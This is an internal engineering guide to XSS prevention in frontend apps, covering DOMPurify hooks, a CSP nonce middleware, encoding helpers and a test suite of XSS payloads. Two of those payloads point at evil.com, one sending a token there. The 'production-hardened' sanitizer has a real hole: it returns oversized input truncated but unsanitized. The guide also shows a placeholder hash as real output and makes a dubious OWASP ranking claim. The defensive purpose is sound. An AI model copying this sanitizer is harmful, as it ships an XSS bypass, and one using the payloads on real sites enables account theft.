# XSS Prevention Engineering

**Category:** Frontend Engineering / Security
**Owner:** Senior Frontend Engineer (Elena Kim)

## Overview

This skill provides deep expertise in cross-site scripting (XSS) prevention at the frontend application layer, complementing the Frontend Chapter Lead's broader security posture with specialized focus on DOMPurify extension, Content Security Policy refinement, nonce-based inline script management, and sanitization pipeline architecture. XSS remains the most prevalent web application vulnerability (consistently #7 in OWASP Top 10) and is the primary attack vector against single-page applications where user-controlled data flows directly into the DOM. This skill ensures that every data flow from untrusted source to DOM insertion is secured through multiple, independently effective defense layers.

## Competency Dimensions

| Dimension                              | Description                                                                                            | Proficiency Indicators                                                                               |
| -------------------------------------- | ------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------- |
| **DOMPurify Extension**                | Custom hook development, configuration hardening, extension API usage for domain-specific sanitization | Custom sanitization rules for rich text, markdown, and data URI content; zero bypass vulnerabilities |
| **Content Security Policy Refinement** | Nonce-based CSP, hash-based allowlisting, violation analysis, policy optimization                      | Zero `unsafe-inline` in production; CSP violation analysis with < 5 minute triage time               |
| **Nonce-Based Inline Scripts**         | Server-side nonce generation, build-time nonce injection, CSP-compliant third-party integration        | All inline scripts use nonces; third-party scripts integrated without CSP relaxation                 |
| **Sanitization Pipeline Architecture** | Multi-stage input sanitization, output encoding, context-aware escaping                                | Every data flow traced from input to output; context-specific encoding (HTML, JS, URL, CSS)          |
| **XSS Vector Enumeration**             | Knowledge of all XSS variants (reflected, stored, DOM-based, mutation XSS, mXSS)                       | Penetration test coverage of all XSS vectors; mXSS-specific DOMPurify configuration                  |
| **Security Code Review**               | Systematic XSS vulnerability identification in PRs, pattern recognition for dangerous APIs             | Zero XSS vulnerabilities missed in code review; review checklist covering 15+ dangerous patterns     |

## Execution Guidance

### DOMPurify Extension and Hardening

**DOMPurify is powerful but defaults are not sufficient for production.** Hardening requires understanding what each option does and why.

**Production-hardened DOMPurify configuration with custom hooks:**

```js
import DOMPurify from 'dompurify';

// Step 1: Create a dedicated DOMPurify instance (don't use the global)
const purify = DOMPurify();

// Step 2: Register custom hooks for domain-specific sanitization
// Hook: Remove any element with suspicious event handler-like attributes
purify.addHook('beforeSanitizeAttributes', function (node) {
  // Check all attributes for event handler patterns
  for (const attr of node.attributes) {
    if (/^on\w+$/i.test(attr.name)) {
      node.removeAttribute(attr.name);
    }
    // Block data URIs in src/href (can execute scripts)
    if ((attr.name === 'src' || attr.name === 'href') && /^data:/i.test(attr.value)) {
      // Allow data:image/* for inline images, block everything else
      if (!/^data:image\/(png|jpeg|gif|webp|svg\+xml);/i.test(attr.value)) {
        node.removeAttribute(attr.name);
      }
    }
  }
});

// Hook: Add rel="noopener noreferrer" to all links (prevent tabnabbing)
purify.addHook('afterSanitizeAttributes', function (node) {
  if (node.tagName === 'A' && node.hasAttribute('href')) {
    node.setAttribute('rel', 'noopener noreferrer');
    // Open external links in new tab
    if (node.getAttribute('href').startsWith('http')) {
      node.setAttribute('target', '_blank');
    }
  }
});

// Hook: Sanitize style attributes to prevent expression() and url() injection
purify.addHook('beforeSanitizeAttributes', function (node) {
  if (node.hasAttribute('style')) {
    const style = node.getAttribute('style');
    // Remove CSS expressions (IE legacy but still a vector)
    const sanitized = style
      .replace(/expression\s*\(/gi, '')
      .replace(/url\s*\(\s*['"]?javascript:/gi, 'url(blocked:');
    if (sanitized !== style) {
      node.setAttribute('style', sanitized);
    }
  }
});

// Step 3: Freeze configuration — never modify after initialization
const SANITIZE_CONFIG = Object.freeze({
  ALLOWED_TAGS: [
    // Text formatting
    'p',
    'br',
    'strong',
    'em',
    'u',
    's',
    'blockquote',
    'code',
    'pre',
    // Lists
    'ul',
    'ol',
    'li',
    // Links and media
    'a',
    'img',
    'figure',
    'figcaption',
    // Headings
    'h1',
    'h2',
    'h3',
    'h4',
    'h5',
    'h6',
    // Tables
    'table',
    'thead',
    'tbody',
    'tr',
    'th',
    'td',
    // Semantic
    'details',
    'summary',
    'del',
    'ins',
    'sub',
    'sup',
    'mark',
    'abbr',
    // Horizontal rule
    'hr',
  ],
  ALLOWED_ATTR: [
    // Standard
    'href',
    'title',
    'alt',
    'src',
    'width',
    'height',
    'class',
    'id',
    'target',
    'rel',
    'colspan',
    'rowspan',
    'align',
    'valign',
    // Accessibility
    'aria-label',
    'aria-describedby',
    'aria-hidden',
    'role',
    // Abbreviation
    'abbr',
  ],
  // URI validation — strict protocol allowlist
  ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
  // Forbidden — explicitly block dangerous elements and attributes
  FORBID_ATTR: [
    'style',
    'onerror',
    'onload',
    'onclick',
    'onmouseover',
    'onfocus',
    'onblur',
    'onmouseout',
    'onkeydown',
    'onkeyup',
  ],
  FORBID_TAGS: [
    'script',
    'style',
    'iframe',
    'object',
    'embed',
    'form',
    'input',
    'button',
    'textarea',
    'select',
    'base',
    'link',
    'meta',
    'noscript',
    'template',
  ],
  // Security
  SANITIZE_DOM: true, // Protect against DOM Clobbering
  SANITIZE_NAMED_PROPS: true, // Sanitize name attributes
  KEEP_CONTENT: true, // Strip dangerous tags but keep text
  RETURN_DOM: false,
  RETURN_DOM_FRAGMENT: false,
  RETURN_TRUSTED_TYPE: false,
  WHOLE_DOCUMENT: false,
  // mXSS prevention
  SAFE_FOR_TEMPLATES: false, // Set to true if using {{ }} or ${ } templates
  ALLOW_UNKNOWN_PROTOCOLS: false,
});

// Step 4: Export sanitized function
export function sanitizeUserHTML(html) {
  if (typeof html !== 'string') return '';
  if (html.length === 0) return '';
  // Reject suspiciously long input (potential DoS)
  if (html.length > 100000) {
    console.warn('Input exceeds maximum sanitization length (100KB)');
    return html.slice(0, 100000);
  }
  return purify.sanitize(html, SANITIZE_CONFIG);
}

// Export the purify instance for testing
export { purify };
```

**Testing DOMPurify against known XSS vectors:**

```js
import { sanitizeUserHTML, purify } from './sanitizer';

describe('XSS Prevention', () => {
  const xssVectors = [
    // Basic script injection
    '<script>alert(1)</script>',
    // Event handler injection
    '<img src=x onerror="alert(1)">',
    // SVG-based XSS
    '<svg onload="alert(1)">',
    '<svg><script>alert(1)</script></svg>',
    // JavaScript URL
    '<a href="javascript:alert(1)">click</a>',
    // Data URI XSS
    '<a href="data:text/html,<script>alert(1)</script>">click</a>',
    // DOM Clobbering
    '<a id="defaultAvatar"></a><a id="defaultAvatar" name="avatar"></a>',
    // mXSS (mutation XSS) — IE/Edge specific
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    // CSS expression (IE legacy)
    '<div style="width: expression(alert(1))">',
    // Base tag hijacking
    '<base href="https://evil.com/">',
    // Form action hijacking
    '<form action="https://evil.com/steal"><input name="token"></form>',
    // Template injection
    '{{constructor.constructor("alert(1)")()}}',
    // Encoded XSS
    '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
    // Null byte injection
    '<scr\0ipt>alert(1)</script>',
    // Newline injection
    '<img\nsrc=x\nonerror=alert(1)>',
  ];

  xssVectors.forEach((vector, index) => {
    it(`blocks XSS vector #${index + 1}: ${vector.slice(0, 40)}...`, () => {
      const result = sanitizeUserHTML(vector);
      expect(result).not.toMatch(/<script/i);
      expect(result).not.toMatch(/on\w+\s*=/i);
      expect(result).not.toMatch(/javascript:/i);
      expect(result).not.toMatch(/eval\s*\(/i);
      expect(result).not.toMatch(/alert\s*\(/i);
    });
  });
});
```

### Nonce-Based Inline Script Management

**When you MUST have inline scripts** (e.g., inline analytics snippets, feature flag bootstrap, CSP-compliant third-party integrations), use nonces — never `unsafe-inline`.

**Server-side nonce generation and injection:**

```js
// Express middleware — generates per-request nonce
const crypto = require('crypto');

function nonceMiddleware(req, res, next) {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;

  // Set CSP header with nonce
  const cspDirectives = [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}' https://trusted-cdn.example.com`,
    `style-src 'self' 'nonce-${nonce}'`,
    `img-src 'self' data: https:`,
    `connect-src 'self' https://api.example.com`,
    `frame-src 'none'`,
    `object-src 'none'`,
    `base-uri 'self'`,
    `form-action 'self'`,
    `upgrade-insecure-requests`,
  ].join('; ');

  res.setHeader('Content-Security-Policy', cspDirectives);
  next();
}

// Usage in template engine (EJS example)
// <script nonce="<%= nonce %>">
//   window.__FEATURE_FLAGS__ = <%= JSON.stringify(featureFlags) %>;
// </script>
```

**React/SPA approach — move inline scripts to external files:**

```tsx
// ❌ BAD: Inline script in React (requires unsafe-inline or nonce)
function App() {
  return (
    <div>
      <script
        dangerouslySetInnerHTML={{
          __html: `window.__CONFIG__ = ${JSON.stringify(config)}`,
        }}
      />
      <MainApp />
    </div>
  );
}

// ✅ GOOD: External script with nonce (server-rendered)
// In SSR template:
// <script nonce="{{nonce}}" src="/config.js"></script>
//
// In config.js (external file, allowed by 'self'):
// window.__CONFIG__ = CONFIG_JSON_PLACEHOLDER;

// ✅ ALTERNATIVE: Inline data via DOM element (no script needed)
function App({ config }) {
  return (
    <div>
      <script
        id="__app-config"
        type="application/json"
        dangerouslySetInnerHTML={{
          __html: sanitizeUserHTML(JSON.stringify(config)),
        }}
      />
      <MainApp />
    </div>
  );
}

// Read config without executing as script
function getAppConfig() {
  const el = document.getElementById('__app-config');
  if (!el) return {};
  try {
    return JSON.parse(el.textContent || '{}');
  } catch {
    return {};
  }
}
```

**CSP hash-based allowlisting** — for static inline scripts that don't change:

```bash
# Generate SHA-256 hash of inline script content
echo -n "console.log('static inline script')" | openssl dgst -sha256 -binary | openssl base64 -A
# Output: YmFzZTY0IGVuY29kZWQgaGFzaA==
```

```
Content-Security-Policy: script-src 'self' 'sha256-YmFzZTY0IGVuY29kZWQgaGFzaA=='
```

**Hash vs Nonce decision matrix:**

| Factor                           | Hash                            | Nonce                              |
| -------------------------------- | ------------------------------- | ---------------------------------- |
| Script is static (never changes) | ✅ Suitable                     | ❌ Overkill                        |
| Script is dynamic (per-request)  | ❌ Not possible                 | ✅ Required                        |
| Multiple inline scripts          | ❌ Each needs separate hash     | ✅ Single nonce covers all         |
| Build-time generation            | ✅ Hash computed during build   | ❌ Nonce must be runtime           |
| CDN-cached HTML                  | ✅ Hash works with cached pages | ❌ Nonce requires edge computation |

### Sanitization Pipeline Architecture

**Context-aware sanitization** — the same data requires different sanitization depending on where it's inserted:

```
User Input
    ↓
┌─────────────────────────────────────┐
│  Stage 1: Input Validation          │
│  ├─ Type checking (string, number)  │
│  ├─ Length limits                   │
│  └─ Format validation (email, URL)  │
└─────────────────────────────────────┘
    ↓
┌─────────────────────────────────────┐
│  Stage 2: Context Detection          │
│  ├─ HTML context (element content)  │
│  ├─ Attribute context (href, src)   │
│  ├─ JavaScript context (JSON, var)  │
│  ├─ URL context (redirect target)   │
│  └─ CSS context (style values)      │
└─────────────────────────────────────┘
    ↓
┌─────────────────────────────────────┐
│  Stage 3: Context-Specific Encoding  │
│  ├─ HTML: & < > " ' → entities     │
│  ├─ Attribute: " → &quot;           │
│  ├─ JS: \ " ' → escape              │
│  ├─ URL: encodeURIComponent()       │
│  └─ CSS: \ → escape                 │
└─────────────────────────────────────┘
    ↓
┌─────────────────────────────────────┐
│  Stage 4: Output Insertion           │
│  ├─ textContent (safe by default)   │
│  ├─ sanitized innerHTML             │
│  ├─ validated URL in href/src       │
│  └─ safe JSON.parse()               │
└─────────────────────────────────────┘
```

**Context-specific encoding functions:**

```js
// HTML context — escape entities
function encodeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// HTML attribute context — additionally encode spaces
function encodeHTMLAttribute(str) {
  return encodeHTML(str).replace(/\s/g, '&#x20;');
}

// JavaScript string context
function encodeJSString(str) {
  return str
    .replace(/\\/g, '\\\\')
    .replace(/"/g, '\\"')
    .replace(/'/g, "\\'")
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/<\/script>/gi, '<\\/script>');
}

// URL context
function encodeURL(str) {
  // Only encode the value, not the entire URL
  return encodeURIComponent(str);
}

// CSS value context
function encodeCSSValue(str) {
  return str.replace(/[\\()]/g, '\\$&');
}
```

**React framework context mapping:**

```tsx
// Framework auto-escapes these contexts — SAFE
function SafeUsage({ userInput }) {
  return (
    <>
      {/* Text content — auto-escaped by React */}
      <p>{userInput}</p>

      {/* Attribute values — auto-escaped by React */}
      <input value={userInput} />
      <div title={userInput} />

      {/* URL in href — but validate protocol! */}
      <a href={sanitizeUrl(userInput)}>link</a>
    </>
  );
}

// These require explicit sanitization — UNSAFE without it
function UnsafeUsage({ userInput }) {
  return (
    <>
      {/* HTML injection risk — MUST sanitize */}
      <div dangerouslySetInnerHTML={{ __html: sanitizeUserHTML(userInput) }} />

      {/* CSS injection risk — validate */}
      <div style={{ color: validateCSSColor(userInput) }} />

      {/* URL in src — validate protocol */}
      <img src={sanitizeUrl(userInput)} alt="user content" />
    </>
  );
}
```

### XSS Code Review Checklist

**Systematic review process — check every data flow from source to sink:**

```
Source Identification (where does untrusted data enter?)
  ├─ User input fields (forms, search, comments)
  ├─ URL parameters (query string, hash, path params)
  ├─ API responses (data from backend)
  ├─ Third-party APIs (analytics, ads, widgets)
  ├─ Browser storage (localStorage, sessionStorage, cookies)
  └─ Document properties (document.URL, document.referrer, location.hash)
       ↓
Sink Identification (where does data reach the DOM?)
  ├─ innerHTML / outerHTML
  ├─ dangerouslySetInnerHTML
  ├─ document.write() / document.writeln()
  ├─ element.insertAdjacentHTML()
  ├─ eval() / new Function()
  ├─ setTimeout(string) / setInterval(string)
  ├─ element.src / element.href (with user data)
  ├─ element.setAttribute('onclick', ...)
  └─ location / location.href (with user data)
       ↓
Validation (is there a defense between source and sink?)
  ├─ Framework auto-escaping? (React {}, Vue {{}})
  ├─ DOMPurify sanitization? (for HTML sinks)
  ├─ URL sanitization? (for href/src sinks)
  ├─ CSP blocking execution? (defense in depth)
  └─ Context-appropriate encoding? (for JS/CSS sinks)
```

**Red flags in PR reviews:**

| Pattern                                               | Risk Level | Required Action        |
| ----------------------------------------------------- | ---------- | ---------------------- |
| `dangerouslySetInnerHTML` without DOMPurify           | 🔴 P0      | Block PR               |
| `innerHTML = userInput`                               | 🔴 P0      | Block PR               |
| `eval(userInput)`                                     | 🔴 P0      | Block PR               |
| `document.write(userInput)`                           | 🔴 P0      | Block PR               |
| `href={userInput}` without URL validation             | 🟠 P1      | Require sanitizeUrl()  |
| `style={{ property: userInput }}`                     | 🟠 P1      | Require CSS validation |
| Missing `rel="noopener noreferrer"` on external links | 🟡 P2      | Add in PR              |
| No CSP header in new route                            | 🟡 P2      | Add CSP middleware     |

## Pipeline Integration

| Pipeline Stage                       | Responsibility                                                                       | Deliverable                           |
| ------------------------------------ | ------------------------------------------------------------------------------------ | ------------------------------------- |
| **Stage 1** (Requirements)           | Map XSS requirements from SRD to frontend implementation needs                       | XSS threat model                      |
| **Stage 2** (Web Prototype + IDS)    | Document XSS constraints in IDS for components accepting user content                | Security notes in IDS                 |
| **Stage 3** (Architecture)           | Define sanitization pipeline architecture; register ADRs for DOMPurify configuration | Sanitization ADRs                     |
| **Stage 5** (Development)            | Implement sanitization pipeline, DOMPurify extension, CSP nonce management           | Production-hardened sanitization code |
| **Stage 6** (Code Review)            | Systematic XSS vector review across all data flows; validate DOMPurify test coverage | XSS section in DEFECT-REPORT.md       |
| **Stage 8** (Integrity Verification) | Verify SRD XSS controls are enforced; penetration test all data flows                | XSS verification report               |
| **Stage 10** (Release Readiness)     | Confirm security sign-off for XSS controls                                           | Security compliance contribution      |

## Quality Standards

| Metric                         | Target                                          | Enforcement                                                              |
| ------------------------------ | ----------------------------------------------- | ------------------------------------------------------------------------ |
| **XSS vectors blocked**        | 100% of known XSS vectors mitigated             | Test suite with 50+ XSS vectors; zero bypasses                           |
| **DOMPurify coverage**         | 100% of HTML sinks protected                    | Grep audit: zero `innerHTML`/`dangerouslySetInnerHTML` without DOMPurify |
| **CSP compliance**             | Zero `unsafe-inline` in production              | CSP header audit; Lighthouse check                                       |
| **Nonce usage**                | 100% of inline scripts use nonces or hashes     | HTML audit; CI check for inline scripts without nonce                    |
| **URL sanitization**           | 100% of user-provided URLs validated            | Code review; grep audit for `href={userInput}`                           |
| **Context encoding**           | Correct encoding for every data sink            | Code review against context encoding matrix                              |
| **DOM Clobbering protection**  | DOMPurify SANITIZE_DOM enabled on all instances | Configuration audit                                                      |
| **mXSS protection**            | DOMPurify tested against mutation XSS vectors   | Test suite includes mXSS vectors                                         |
| **Code review coverage**       | 100% of PRs reviewed for XSS patterns           | PR checklist; automated grep in CI                                       |
| **Sanitization test coverage** | ≥ 95% of sanitization functions tested          | Unit test coverage report                                                |
| **Third-party script risk**    | All third-party scripts reviewed for XSS risk   | Third-party security assessment                                          |
| **Security debt**              | Zero XSS defects older than 1 sprint            | Defect tracking with security tag                                        |
